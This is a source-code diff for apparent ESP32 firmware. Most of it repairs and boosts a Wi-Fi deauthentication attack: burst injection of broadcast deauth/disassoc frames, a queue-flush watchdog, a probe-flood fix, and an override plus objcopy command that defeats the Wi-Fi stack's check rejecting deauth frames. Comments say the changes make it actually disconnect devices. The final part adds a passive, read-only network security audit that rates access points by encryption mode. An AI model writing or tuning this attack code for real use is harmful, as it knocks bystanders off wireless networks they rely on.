+// start the client sniffer. Deauth frames are then injected on WIFI_IF_STA.
+//
+// Why STA and not a SoftAP: a broadcast deauth sent from an idle SoftAP goes
+// into the AP's group-addressed (DTIM) TX queue, which never flushes while no
+// client is associated to our AP -- the frames pile up to the ~32-buffer depth
+// and never reach the air (the frozen-at-32 stall). Beacons use a separate
+// queue, which is exactly why BeaconSpammer transmits but deauth did not. In
+// STA/monitor mode there is no group-cast queue, so a broadcast management
+// frame injects straight onto the channel. Broadcast is never ACKed either, so
+// there's no unicast ACK-wait buffer pin. This is the Spacehuhn/Marauder path.
+//
+// Factored out so the recovery paths (resetWifi) can fully re-arm after an
+// esp_wifi_stop()/start().
+static void deautherArmRadio() {
+  // Settle delays matter on a cold boot: without them the mode/start hasn't
+  // taken effect before we enable promiscuous and inject, and TX silently does
+  // nothing until the next re-arm ("doesn't send after a restart").
+  esp_wifi_set_mode(WIFI_MODE_STA);
+  delay(50);
+  esp_wifi_start();
+  delay(50);
+  // Promiscuous ON: required for raw injection, and also lets set_channel stick
+  // on a disconnected STA and keeps the client harvest ("Clients seen") live.
+  deautherStartSniffer();
+  esp_wifi_set_channel(selectedChannel, WIFI_SECOND_CHAN_NONE);
+}
+
 static void deautherOpenTarget(int index) {
   if (index < 0 || index >= network_count) {
     return;
@@ -4289,23 +4848,49 @@ static void deautherOpenTarget(int index) {
   selected_ap_index = index;
   selectedAp = ap_list[index];
   selectedChannel = ap_list[index].primary;
+
+  packet_count = 0;
+  success_count = 0;
+  consecutive_failures = 0;
+  s_txNoMem = 0;
+  s_lastTxErr = 0;
+  s_rearmCount = 0;
+
+  deautherArmRadio();
+
   drawAttackScreen();
 }
 
+// Bypass the WiFi stack's deauth/disassoc frame rejection (the source of
+// "wifi: unsupport frame type: 0c0"). On classic ESP32 this symbol is weak and
+// the override just works. On the S3 it ships as a STRONG symbol in
+// libnet80211.a, so this override only links after that lib is patched to
+// weaken the symbol:
+//   xtensa-esp32s3-elf-objcopy --weaken-symbol=ieee80211_raw_frame_sanity_check \
+//       <core>/tools/sdk/esp32s3/lib/libnet80211.a
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
     return 0;
 }
 
-void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
-    esp_err_t res = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
+esp_err_t wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size,
+                                      wifi_interface_t iface) {
+    esp_err_t res = esp_wifi_80211_tx(iface, frame_buffer, size, false);
+    if (res == ESP_ERR_NO_MEM) {
+        // TX queue full — backpressure, not a real send and not a fault. Don't
+        // count it as a packet (it would crater the displayed success rate) or
+        // toward the reset guard. The caller yields to let the queue drain.
+        s_txNoMem++;
+        return res;
+    }
     packet_count++;
     if (res == ESP_OK) {
         success_count++;
         consecutive_failures = 0;
     } else {
+        s_lastTxErr = (int32_t)res;
         consecutive_failures++;
-
     }
+    return res;
 }
 
 void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record, uint8_t chan) {
@@ -4313,7 +4898,7 @@ void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record, uint8_t c
     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
     memcpy(&deauth_frame[10], ap_record->bssid, 6);
     memcpy(&deauth_frame[16], ap_record->bssid, 6);
-    deauth_frame[26] = 7;
+    deauth_frame[24] = 7;
 
     wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame));
 }
@@ -4460,10 +5045,19 @@ bool checkApChannel(const uint8_t *bssid, uint8_t *channel) {
 void resetWifi() {
     esp_wifi_stop();
     delay(200);
-    esp_wifi_start();
+    // Re-arm the STA/monitor radio + channel + sniffer. esp_wifi_stop() dropped
+    // them; without re-arming, injection stays dead after the reset.
+    deautherArmRadio();
+    // Trailing settle is REQUIRED: after a re-arm the radio needs a moment before
+    // it will actually transmit. Without this the next burst enqueues fine (the
+    // packet counter still climbs) but nothing reaches the air and no device gets
+    // kicked. This is the delay whose removal broke the kick -- keep it.
     delay(200);
-    packet_count = 0;
-    success_count = 0;
+    // NOTE: packet_count/success_count are intentionally NOT zeroed here. This
+    // runs on every queue-flush re-arm (~1x/sec at full tilt); zeroing them made
+    // the on-screen counter bounce (the "32 -> 300 -> 32" the user saw). Keeping
+    // them cumulative makes the display climb smoothly. Only the failure guard's
+    // counter is reset.
     consecutive_failures = 0;
 }
 
@@ -4513,6 +5107,26 @@ void drawAttackScreen() {
     snprintf(buf, sizeof(buf), "Heap: %u", ESP.getFreeHeap());
     tft.setCursor(10, 145);
     tft.println(buf);
+
+    const int cc = s_deauthClientCount;
+    snprintf(buf, sizeof(buf), "Clients seen: %d", cc);
+    tft.setCursor(10, 160);
+    tft.setTextColor(cc > 0 ? GREEN : UI_DIM_TEXT);
+    tft.println(buf);
+    tft.setTextColor(WHITE);
+
+    // On-screen diagnostics (stand-in for serial): queue-full count, re-arm
+    // count, and the last non-OK/non-NO_MEM TX error code.
+    snprintf(buf, sizeof(buf), "TX full: %u  Rearm: %u",
+             (unsigned)s_txNoMem, (unsigned)s_rearmCount);
+    tft.setCursor(10, 175);
+    tft.println(buf);
+
+    snprintf(buf, sizeof(buf), "Last TX err: %ld", (long)s_lastTxErr);
+    tft.setCursor(10, 190);
+    tft.setTextColor(s_lastTxErr != 0 ? UI_WARN : UI_DIM_TEXT);
+    tft.println(buf);
+    tft.setTextColor(WHITE);
 
     const char* buttons[] = {attack_running ? "Stop" : "Start", "Back"};
     drawTabBar(buttons[0], false, "", true, buttons[1], false);
@@ -4788,6 +5402,7 @@ void deautherSetup() {
 void deautherLoop() {
 
     if (feature_active && (isButtonPressed(BTN_SELECT) || featureExitButtonPressed())) {
+        deautherStopSniffer();  // clear our promiscuous cb before leaving
         feature_exit_requested = true;
         return;
     }
@@ -4805,47 +5420,105 @@ void deautherLoop() {
     if (attack_running && selected_ap_index != -1) {
         uint32_t heap = ESP.getFreeHeap();
         if (heap < 80000) {
-            attack_running = false;
+            // Low heap. Instead of killing the attack for the rest of the
+            // session (the old behaviour -- the user just saw it "stop"), tear
+            // the stack down and re-arm: resetWifi() frees the WiFi driver's
+            // buffers and brings the SoftAP back, which usually reclaims enough
+            // to continue. Only hard-stop if memory is still critically low.
+            resetWifi();
             last_packet_time = 0;
+            delay(1000);
+            if (ESP.getFreeHeap() < 60000) {
+                attack_running = false;
+            }
             drawAttackScreen();
-            delay(3000);
             return;
         }
 
         if (consecutive_failures > 10) {
+            // TX has been failing -- usually means the SoftAP dropped (another
+            // code path flipped the radio out of AP mode). resetWifi() now
+            // fully re-arms the AP + channel + sniffer, so recovery is real;
+            // keep the pause short so it resumes promptly instead of looking
+            // like the attack died.
             resetWifi();
             last_packet_time = 0;
-            delay(3000);
+            delay(200);
             return;
         }
 
-        if (current_time - last_packet_time >= 100 && attack_running) {
-            wsl_bypasser_send_deauth_frame(&selectedAp, selectedChannel);
+        // Queue-flush watchdog. On this S3, STA injection sends a batch and then
+        // the TX queue WEDGES (successful sends stop; only NO_MEM backpressure
+        // continues). An esp_wifi_stop()/start() re-arm flushes the queue so the
+        // next batch goes out -- this periodic flush is what actually keeps the
+        // deauth flowing and kicks devices, NOT noise. So the trigger is: no new
+        // *successful* sends (packet_count flat) for a short window -> flush.
+        // Measuring packet_count only (not +NO_MEM) is deliberate: backpressure
+        // means wedged, which is exactly when we want to flush.
+        static uint32_t s_lastProgressMs = 0;
+        static uint32_t s_lastProgressCount = 0;
+        if (packet_count != s_lastProgressCount || s_lastProgressMs == 0) {
+            s_lastProgressCount = packet_count;
+            s_lastProgressMs = current_time;
+        } else if (current_time - s_lastProgressMs > 1200) {
+            s_rearmCount++;
+            resetWifi();                     // flush the wedged TX queue
+            s_lastProgressCount = packet_count;
+            s_lastProgressMs = current_time;
+            last_packet_time = 0;
+            return;
+        }
+
+        if (attack_running) {
+            // Burst send. The old code sent ONE frame per 100ms (~10/s ceiling)
+            // and re-set the channel on every frame. Pin the channel once, build
+            // the frame once, then fire a batch each loop so the rate is limited
+            // by the radio, not an artificial timer.
+            esp_wifi_set_channel(selectedChannel, WIFI_SECOND_CHAN_NONE);
+
+            // Rotate frame variants: different client stacks honor different
+            // subtypes/reason codes, so interleave deauth (0xC0) + disassoc
+            // (0xA0) with a couple of reason codes.
+            static const uint8_t subtypes[] = { 0xC0, 0xA0 };   // deauth, disassoc
+            static const uint8_t reasons[]  = { 7, 1 };         // class-3, unspecified
+            const uint8_t* bssid = selectedAp.bssid;
+
+            static const uint8_t bcast[6] = { 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF };
+
+            // BROADCAST receiver (addr1). Unicast (a client MAC or the AP's own
+            // BSSID) makes the radio wait for an ACK that never comes and pins
+            // the TX buffers -- the old 32-packet "hang". We vary subtype
+            // (deauth/disassoc) + reason code for breadth. Harvested client list
+            // is recon/display only, not used for TX.
+            //
+            // Push a batch but STOP at the first ESP_ERR_NO_MEM. Once the queue
+            // is full, spinning the rest of the batch (the old delay(1) per
+            // frame) just burned ~48ms doing nothing and left the counter
+            // frozen. Backing off lets the queue drain before the next loop --
+            // and if it genuinely stops draining, the stall watchdog above
+            // notices the counter isn't moving and re-arms the radio.
+            for (int b = 0; b < 48 && attack_running; b++) {
+                memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame));
+                deauth_frame[0]  = subtypes[b & 1];
+                memcpy(&deauth_frame[4],  bcast, 6);
+                memcpy(&deauth_frame[10], bssid, 6);
+                memcpy(&deauth_frame[16], bssid, 6);
+                deauth_frame[24] = reasons[(b >> 1) & 1];
+                // Inject on WIFI_IF_STA (STA/monitor mode) -- see deautherArmRadio.
+                if (wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame), WIFI_IF_STA)
+                        == ESP_ERR_NO_MEM) {
+                    break;   // queue full -- back off, retry next loop
+                }
+            }
             last_packet_time = current_time;
         }
     }
 
-    static uint32_t last_channel_check = 0;
-    if (attack_running && current_time - last_channel_check > 15000) {
-        uint8_t new_channel;
-        if (checkApChannel(selectedAp.bssid, &new_channel)) {
-            if (new_channel != selectedChannel) {
-                selectedChannel = new_channel;
-                wifi_config_t ap_config = {0};
-                strncpy((char*)ap_config.ap.ssid, "ESP32-DIV", sizeof(ap_config.ap.ssid));
-                ap_config.ap.ssid_len = strlen("ESP32-DIV");
-                strncpy((char*)ap_config.ap.password, "deauth123", sizeof(ap_config.ap.password));
-                ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
-                ap_config.ap.ssid_hidden = 0;
-                ap_config.ap.max_connection = 4;
-                ap_config.ap.beacon_interval = 100;
-                ap_config.ap.channel = selectedChannel;
-                ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
-
-            }
-        }
-        last_channel_check = current_time;
-    }
+    // NOTE: a periodic checkApChannel() rescan used to run here every 15s. It
+    // did a blocking STA scan mid-attack, which switched the radio out of AP
+    // mode and killed raw TX — the real reason deauth only "pulsed" every ~20s.
+    // Each frame already re-pins the channel via esp_wifi_set_channel(), so the
+    // rescan was both harmful and redundant and has been removed.
 
     static uint32_t last_status_time = 0;
     if (attack_running && current_time - last_status_time > 2000) {
@@ -4934,6 +5607,27 @@ static void probeOpenTarget(int index) {
   selected_ap_index = index;
   selectedAp = ap_list[index];
   selectedChannel = ap_list[index].primary;
+
+  // Probe frames are injected through WIFI_IF_AP, which only works with a real
+  // (hidden) SoftAP up on the target channel. The list scan leaves the radio in
+  // STA mode, so bring the AP up now — mirrors startListening() / BeaconSpammer.
+  // Without this esp_wifi_80211_tx() mostly failed and frames only trickled out
+  // when another code path happened to flip to AP mode.
+  WiFi.mode(WIFI_AP);
+  delay(30);
+  wifi_config_t ap_config = {};
+  strncpy((char*)ap_config.ap.ssid, "ESP32-DIV", sizeof(ap_config.ap.ssid));
+  ap_config.ap.ssid_len = 9;
+  ap_config.ap.password[0] = '\0';
+  ap_config.ap.authmode = WIFI_AUTH_OPEN;
+  ap_config.ap.ssid_hidden = 1;
+  ap_config.ap.max_connection = 4;
+  ap_config.ap.beacon_interval = 100;
+  ap_config.ap.channel = selectedChannel;
+  esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+  esp_wifi_start();
+  esp_wifi_set_channel(selectedChannel, WIFI_SECOND_CHAN_NONE);
+
   drawAttackScreen();
 }
 
@@ -5513,27 +6207,10 @@ void probeRequestFloodLoop() {
         }
     }
 
-    static uint32_t last_channel_check = 0;
-    if (attack_running && current_time - last_channel_check > 15000) {
-        uint8_t new_channel;
-        if (checkApChannel(selectedAp.bssid, &new_channel)) {
-            if (new_channel != selectedChannel) {
-                selectedChannel = new_channel;
-                wifi_config_t ap_config = {0};
-                strncpy((char*)ap_config.ap.ssid, "ESP32-DIV", sizeof(ap_config.ap.ssid));
-                ap_config.ap.ssid_len = strlen("ESP32-DIV");
-                strncpy((char*)ap_config.ap.password, "deauth123", sizeof(ap_config.ap.password));
-                ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
-                ap_config.ap.ssid_hidden = 0;
-                ap_config.ap.max_connection = 4;
-                ap_config.ap.beacon_interval = 100;
-                ap_config.ap.channel = selectedChannel;
-                ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
-
-            }
-        }
-        last_channel_check = current_time;
-    }
+    // NOTE: a periodic checkApChannel() rescan used to run here every 15s. Its
+    // blocking STA scan switched the radio out of AP mode mid-attack and killed
+    // raw TX. sendProbeFrame() already re-pins the channel each frame, so the
+    // rescan was both harmful and redundant and has been removed.
 
     static uint32_t last_status_time = 0;
     if (attack_running && current_time - last_status_time > 2000) {
@@ -5806,13 +6483,14 @@ static void sendForceDeauth(const uint8_t* bssid, uint8_t channel) {
   }
   esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
 
+  // Inject on WIFI_IF_STA (STA/monitor mode) -- see startListening().
   // AP -> stations (broadcast)
   memcpy(s_deauthFrame, s_deauthTemplate, sizeof(s_deauthFrame));
   s_deauthFrame[0] = 0xC0;
   memset(&s_deauthFrame[4], 0xFF, 6);
   memcpy(&s_deauthFrame[10], bssid, 6);
   memcpy(&s_deauthFrame[16], bssid, 6);
-  (void)esp_wifi_80211_tx(WIFI_IF_AP, s_deauthFrame, sizeof(s_deauthFrame), false);
+  (void)esp_wifi_80211_tx(WIFI_IF_STA, s_deauthFrame, sizeof(s_deauthFrame), false);
   s_deauthSent++;
 
   // Stations -> AP
@@ -5821,7 +6499,7 @@ static void sendForceDeauth(const uint8_t* bssid, uint8_t channel) {
   memcpy(&s_deauthFrame[4], bssid, 6);
   memset(&s_deauthFrame[10], 0xFF, 6);
   memcpy(&s_deauthFrame[16], bssid, 6);
-  (void)esp_wifi_80211_tx(WIFI_IF_AP, s_deauthFrame, sizeof(s_deauthFrame), false);
+  (void)esp_wifi_80211_tx(WIFI_IF_STA, s_deauthFrame, sizeof(s_deauthFrame), false);
   s_deauthSent++;
 
   // Disassoc broadcast as well
@@ -5830,7 +6508,7 @@ static void sendForceDeauth(const uint8_t* bssid, uint8_t channel) {
   memset(&s_deauthFrame[4], 0xFF, 6);
   memcpy(&s_deauthFrame[10], bssid, 6);
   memcpy(&s_deauthFrame[16], bssid, 6);
-  (void)esp_wifi_80211_tx(WIFI_IF_AP, s_deauthFrame, sizeof(s_deauthFrame), false);
+  (void)esp_wifi_80211_tx(WIFI_IF_STA, s_deauthFrame, sizeof(s_deauthFrame), false);
   s_deauthSent++;
 }
 
@@ -5853,24 +6531,22 @@ static void startListening(bool withForce) {
   esp_wifi_set_promiscuous(false);
   esp_wifi_set_promiscuous_rx_cb(nullptr);
 
-  // SoftAP gives us WIFI_IF_AP for raw deauth TX while promiscuous sniffs rejoins.
-  WiFi.mode(WIFI_AP);
-  delay(30);
-  wifi_config_t ap_config = {};
-  strncpy((char*)ap_config.ap.ssid, "ESP32-DIV", sizeof(ap_config.ap.ssid));
-  ap_config.ap.ssid_len = 9;
-  ap_config.ap.password[0] = '\0';
-  ap_config.ap.authmode = WIFI_AUTH_OPEN;
-  ap_config.ap.ssid_hidden = 1;
-  ap_config.ap.max_connection = 4;
-  ap_config.ap.beacon_interval = 100;
-  ap_config.ap.channel = ch;
-  esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+  // STA + monitor (promiscuous) mode -- NOT a SoftAP. A broadcast deauth sent
+  // from an idle SoftAP goes into the AP group-cast/DTIM queue and never leaves
+  // the chip with no client associated (the frozen-queue bug the Deauther hit),
+  // so the old "force" deauth here never actually kicked anyone. In STA/monitor
+  // mode the frames inject straight onto the channel (WIFI_IF_STA), and
+  // promiscuous RX still delivers the mgmt frames we sniff to reveal the SSID.
+  // The force rate here is low (3 frames / 80ms), well under the radio's drain
+  // rate, so unlike the Deauther's full-tilt burst it doesn't wedge the queue
+  // and needs no periodic flush (a flush would interrupt sniffing anyway).
+  esp_wifi_set_mode(WIFI_MODE_STA);
+  delay(50);
   esp_wifi_start();
-  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
-
+  delay(50);
   esp_wifi_set_promiscuous_rx_cb(snifferCallback);
   esp_wifi_set_promiscuous(true);
+  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
 
   s_listening = true;
   s_forcing = withForce;
@@ -9238,6 +9914,316 @@ void karmaLoop() {
 }
 
 }  // namespace KarmaAttack
+
+
+// ───────────────────────── WiFi Security Audit ─────────────────────────
+// Passive posture check: scans nearby APs and rates each one weak->strong
+// from its advertised auth mode, with a plain-language finding per network
+// and a CSV report to SD. Read-only: it never transmits, deauths, or
+// associates. Results are shown on-device; the SD report is optional.
+//
+// Encryption tier (TAG/colour) reflects the auth suite the AP advertises.
+// A separate EXPOSURE axis flags deauth / CSA / downgrade risk: this is
+// DERIVED from the auth mode (PMF is mandatory in WPA3-SAE and optional or
+// absent in WPA2 and below), not measured -- a standard scan does not expose
+// the RSN cipher, the WPS flag, or the 802.11w/PMF bit. So every AP except
+// pure WPA3-SAE is reported as deauth/CSA-exposed, worst-case by design.
+namespace WifiAudit {
+
+static constexpr int kMaxAudit = 48;
+
+// severity: 3 = critical, 2 = weak, 1 = fair, 0 = good (encryption tier)
+struct AuditRow {
+  char    ssid[20];
+  uint8_t channel;
+  int8_t  rssi;
+  uint8_t sev;
+  bool    exposed;     // deauth/CSA/downgrade-exposed (derived from auth mode)
+  char    tag[6];
+  char    info[22];    // compact label shown on the device
+  char    expo[72];    // full exposure finding, written to the CSV report
+};
+
+static AuditRow s_rows[kMaxAudit];
+static int      s_count = 0;
+static int      s_sev[4] = {0, 0, 0, 0};
+static int      s_exposed = 0;
+static int      s_sel = 0;
+static int      s_top = 0;
+static unsigned long s_lastBtnMs = 0;
+static const unsigned long kBtnDebounceMs = 180;
+static String   s_savedMsg;
+
+static constexpr int AUD_SUMMARY_Y = 42;
+static constexpr int AUD_SEP_Y     = 56;
+static constexpr int AUD_FIRST_ROW = 60;
+static constexpr int AUD_ROW_H     = 26;
+
+static int audRowsPerScreen() {
+  const int h = wifiListBottomY() - AUD_FIRST_ROW;
+  return max(1, h / AUD_ROW_H);
+}
+
+static uint16_t sevColor(uint8_t sev) {
+  switch (sev) {
+    case 3:  return TFT_RED;
+    case 2:  return ORANGE;
+    case 1:  return TFT_YELLOW;
+    default: return GREEN;
+  }
+}
+
+static void classify(wifi_auth_mode_t a, AuditRow& r) {
+  switch (a) {
+    case WIFI_AUTH_OPEN:
+      r.sev = 3; r.exposed = true; snprintf(r.tag, sizeof(r.tag), "CRIT");
+      snprintf(r.info, sizeof(r.info), "Open - no crypto");
+      snprintf(r.expo, sizeof(r.expo), "No encryption - all traffic exposed; deauth/CSA trivial"); break;
+    case WIFI_AUTH_WEP:
+      r.sev = 3; r.exposed = true; snprintf(r.tag, sizeof(r.tag), "CRIT");
+      snprintf(r.info, sizeof(r.info), "WEP - crackable");
+      snprintf(r.expo, sizeof(r.expo), "WEP cipher broken - key recoverable; deauth/CSA exposed"); break;
+    case WIFI_AUTH_WPA_PSK:
+      r.sev = 2; r.exposed = true; snprintf(r.tag, sizeof(r.tag), "WEAK");
+      snprintf(r.info, sizeof(r.info), "WPA1 !deauth");
+      snprintf(r.expo, sizeof(r.expo), "WPA1 deprecated - TKIP weak; no PMF, deauth/CSA exposed"); break;
+    case WIFI_AUTH_WPA_WPA2_PSK:
+      r.sev = 1; r.exposed = true; snprintf(r.tag, sizeof(r.tag), "FAIR");
+      snprintf(r.info, sizeof(r.info), "WPA1/2 downgrade");
+      snprintf(r.expo, sizeof(r.expo), "Mixed mode - client downgradable to WPA1/TKIP; deauth/CSA exposed"); break;
+    case WIFI_AUTH_WPA2_PSK:
+      r.sev = 0; r.exposed = true; snprintf(r.tag, sizeof(r.tag), "GOOD");
+      snprintf(r.info, sizeof(r.info), "WPA2 !deauth");
+      snprintf(r.expo, sizeof(r.expo), "WPA2-PSK: PMF optional/off - deauth and CSA attacks likely work"); break;
+    case WIFI_AUTH_WPA2_ENTERPRISE:
+      r.sev = 0; r.exposed = true; snprintf(r.tag, sizeof(r.tag), "GOOD");
+      snprintf(r.info, sizeof(r.info), "WPA2-Ent !deauth");
+      snprintf(r.expo, sizeof(r.expo), "WPA2-Enterprise: deauth/CSA exposed unless 802.11w PMF enforced"); break;
+    case WIFI_AUTH_WPA3_PSK:
+      r.sev = 0; r.exposed = false; snprintf(r.tag, sizeof(r.tag), "GOOD");
+      snprintf(r.info, sizeof(r.info), "WPA3 hardened");
+      snprintf(r.expo, sizeof(r.expo), "WPA3-SAE: PMF mandatory - hardened vs deauth and CSA"); break;
+    case WIFI_AUTH_WPA2_WPA3_PSK:
+      r.sev = 1; r.exposed = true; snprintf(r.tag, sizeof(r.tag), "FAIR");
+      snprintf(r.info, sizeof(r.info), "WPA2/3 downgrade");
+      snprintf(r.expo, sizeof(r.expo), "Transition mode - forceable down to WPA2; WPA2 side deauth/CSA exposed"); break;
+    default:
+      r.sev = 1; r.exposed = true; snprintf(r.tag, sizeof(r.tag), "FAIR");
+      snprintf(r.info, sizeof(r.info), "Auth %d", (int)a);
+      snprintf(r.expo, sizeof(r.expo), "Unrecognized auth mode %d - treat as exposed", (int)a); break;
+  }
+}
+
+// Sort worst-first; within a tier, stronger signal first.
+static int cmpRows(const void* a, const void* b) {
+  const AuditRow* ra = (const AuditRow*)a;
+  const AuditRow* rb = (const AuditRow*)b;
+  if (ra->sev != rb->sev) return (int)rb->sev - (int)ra->sev;
+  return (int)rb->rssi - (int)ra->rssi;
+}
+
+static void runScan() {
+  wifiClearBody(TFT_BLACK);
+  tft.setTextSize(1);
+  tft.setTextColor(GREEN, TFT_BLACK);
+  tft.setCursor(10, AUD_SUMMARY_Y);
+  tft.print("Auditing networks...");
+  loading(100, ORANGE, 0, 0, 3, true);
+
+  pauseBackgroundRadioTasks();
+  WiFi.scanDelete();
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect();
+  delay(50);
+  const uint32_t dwell = wifiStaScanMsPerChannel();
+  const int n = WiFi.scanNetworks(false, true, false, dwell);
+
+  s_count = 0;
+  s_sev[0] = s_sev[1] = s_sev[2] = s_sev[3] = 0;
+  s_exposed = 0;
+  if (n > 0) {
+    const int lim = min(n, kMaxAudit);
+    for (int i = 0; i < lim; i++) {
+      AuditRow& r = s_rows[s_count];
+      const String ss = WiFi.SSID(i);
+      if (ss.length() == 0) {
+        snprintf(r.ssid, sizeof(r.ssid), "(hidden)");
+      } else {
+        strncpy(r.ssid, ss.c_str(), sizeof(r.ssid) - 1);
+        r.ssid[sizeof(r.ssid) - 1] = '\0';
+      }
+      r.channel = (uint8_t)WiFi.channel(i);
+      r.rssi    = (int8_t)WiFi.RSSI(i);
+      classify((wifi_auth_mode_t)WiFi.encryptionType(i), r);
+      s_sev[r.sev]++;
+      if (r.exposed) s_exposed++;
+      s_count++;
+    }
+  }
+  WiFi.scanDelete();
+  if (s_count > 1) {
+    qsort(s_rows, (size_t)s_count, sizeof(AuditRow), cmpRows);
+  }
+  s_sel = 0;
+  s_top = 0;
+  s_savedMsg = "";
+}
+
+static void drawSummary() {
+  tft.fillRect(0, AUD_SUMMARY_Y - 2, tft.width(), 14, TFT_BLACK);
+  tft.setTextSize(1);
+  tft.setCursor(8, AUD_SUMMARY_Y);
+  if (s_savedMsg.length() > 0) {
+    tft.setTextColor(GREEN, TFT_BLACK);
+    tft.print(s_savedMsg);
+    return;
+  }
+  char hb[56];
+  snprintf(hb, sizeof(hb), "C:%d W:%d F:%d OK:%d  Deauth-exp:%d",
+           s_sev[3], s_sev[2], s_sev[1], s_sev[0], s_exposed);
+  tft.setTextColor(GREEN, TFT_BLACK);
+  tft.print(hb);
+}
+
+static void drawRow(int i, int y, bool sel) {
+  tft.fillRect(0, y, tft.width(), AUD_ROW_H, TFT_BLACK);
+  if (i < 0 || i >= s_count) return;
+  const AuditRow& r = s_rows[i];
+  const uint16_t col = sevColor(r.sev);
+
+  tft.setTextSize(1);
+  tft.setTextColor(sel ? ORANGE : col, TFT_BLACK);
+  tft.setCursor(2, y);
+  tft.print(sel ? ">" : " ");
+
+  char line1[40];
+  snprintf(line1, sizeof(line1), "[%s] %s", r.tag, r.ssid);
+  tft.setCursor(10, y);
+  tft.setTextColor(col, TFT_BLACK);
+  tft.print(line1);
+
+  char line2[48];
+  snprintf(line2, sizeof(line2), "%s  ch%u %ddBm",
+           r.info, (unsigned)r.channel, (int)r.rssi);
+  tft.setCursor(16, y + 12);
+  tft.setTextColor(sel ? WHITE : UI_DIM_TEXT, TFT_BLACK);
+  tft.print(line2);
+}
+
+static void drawList(bool full) {
+  if (full) {
+    wifiClearBody(TFT_BLACK);
+    tft.drawFastHLine(0, 19, tft.width(), UI_LINE);
+  }
+  drawSummary();
+  tft.drawFastHLine(0, AUD_SEP_Y, tft.width(), UI_LINE);
+
+  if (s_count == 0) {
+    tft.fillRect(0, AUD_FIRST_ROW, tft.width(), AUD_ROW_H, TFT_BLACK);
+    tft.setTextColor(ORANGE, TFT_BLACK);
+    tft.setCursor(10, AUD_FIRST_ROW);
+    tft.print("No networks. Press Rescan.");
+    return;
+  }
+
+  const int rps = audRowsPerScreen();
+  for (int row = 0; row < rps; row++) {
+    const int i = s_top + row;
+    const int y = AUD_FIRST_ROW + row * AUD_ROW_H;
+    if (i < s_count) drawRow(i, y, i == s_sel);
+    else             tft.fillRect(0, y, tft.width(), AUD_ROW_H, TFT_BLACK);
+  }
+}
+
+static void adjustScroll() {
+  const int rps = audRowsPerScreen();
+  if (s_sel < s_top)             s_top = s_sel;
+  else if (s_sel >= s_top + rps) s_top = s_sel - rps + 1;
+  if (s_top < 0) s_top = 0;
+}
+
+static void saveReport() {
+  if (!isSDCardAvailable()) { s_savedMsg = "No SD card"; drawSummary(); return; }
+  if (!SD.exists("/audit")) SD.mkdir("/audit");
+  char path[36];
+  bool have = false;
+  for (uint16_t i = 0; i < 10000; i++) {
+    snprintf(path, sizeof(path), "/audit/wifi_%04u.csv", (unsigned)i);
+    if (!SD.exists(path)) { have = true; break; }
+  }
+  if (!have) { s_savedMsg = "SD full"; drawSummary(); return; }
+  File f = SD.open(path, FILE_WRITE);
+  if (!f) { s_savedMsg = "Write failed"; drawSummary(); return; }
+  f.println("# ESP32-DIV WiFi Security Audit");
+  f.println("# exposure is DERIVED from the advertised auth mode (PMF/cipher/WPS not measured)");
+  f.println("tier,encryption,deauth_exposed,exposure,ssid,channel,rssi_dbm");
+  char ln[160];
+  for (int i = 0; i < s_count; i++) {
+    const AuditRow& r = s_rows[i];
+    snprintf(ln, sizeof(ln), "%s,\"%s\",%s,\"%s\",\"%s\",%u,%d",
+             r.tag, r.info, r.exposed ? "yes" : "no", r.expo, r.ssid,
+             (unsigned)r.channel, (int)r.rssi);
+    f.println(ln);
+  }
+  f.flush();
+  f.close();
+  s_savedMsg = String("Saved ") + path;
+  drawSummary();
+}
+
+void wifiAuditSetup() {
+  pauseBackgroundRadioTasks();
+  setTouchButtonInputEnabled(true);
+  setTouchNavLabels("Rescan", "Down", "Exit", "Up", "Save");
+  featureClearContent(TFT_BLACK);
+
+  const float v = readBatteryVoltage();
+  drawStatusBar(v, true);
+  redrawTouchButtonBar();
+  setupTouchscreen();
+
+  runScan();
+  drawList(true);
+  redrawTouchButtonBar();
+}
+
+void wifiAuditLoop() {
+  if (feature_active && (isButtonPressed(BTN_SELECT) || featureExitButtonPressed())) {
+    feature_exit_requested = true;
+    return;
+  }
+
+  const unsigned long now = millis();
+  if (now - s_lastBtnMs < kBtnDebounceMs) return;
+
+  if (isButtonPressed(BTN_UP)) {
+    if (s_count > 0) {
+      s_sel = (s_sel - 1 + s_count) % s_count;
+      s_savedMsg = "";
+      adjustScroll();
+      drawList(false);
+    }
+    s_lastBtnMs = now;
+  } else if (isButtonPressed(BTN_DOWN)) {
+    if (s_count > 0) {
+      s_sel = (s_sel + 1) % s_count;
+      s_savedMsg = "";
+      adjustScroll();
+      drawList(false);
+    }
+    s_lastBtnMs = now;
+  } else if (isButtonPressed(BTN_LEFT)) {   // Rescan
+    runScan();
+    drawList(true);
+    redrawTouchButtonBar();
+    s_lastBtnMs = now;
+  } else if (isButtonPressed(BTN_RIGHT)) {  // Save report to SD
+    saveReport();
+    s_lastBtnMs = now;
+  }
+}
+
+}  // namespace WifiAudit
 
 
 namespace FirmwareUpdate {
